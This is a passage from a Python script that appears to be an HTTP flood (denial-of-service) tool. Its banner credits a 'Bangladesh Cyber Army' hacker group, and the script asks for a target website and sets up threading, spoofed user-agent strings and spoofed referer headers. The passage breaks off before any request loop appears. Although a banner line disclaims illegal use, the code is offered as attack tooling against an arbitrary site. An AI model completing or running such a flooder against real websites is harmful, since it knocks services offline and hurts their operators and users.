import os
import requests
import threading
import random
import os

print(''' 

\033[1;32m [Muslim Hacker] 
\033[1;31m [Hacker R3z7 Final] \033[1;32m [Bangladesh Cyber Army ][ʘ⁠‿⁠ʘ]
Join with us: [Bangladesh Cyber Army]
\033[1;31m [Don't Use it illegal activities]   
''')
url = input("Target Website:").strip()

count = 0
headers = []
referer = [
  "https://ministerbd.com/",
  "https://marazzakkhan.com/",
]


def useragent():
  global headers
  headers.append(
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
  headers.append(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
  )
  headers.append(
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36"
  )
  headers.append(
    "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3"
  )
  headers.append(
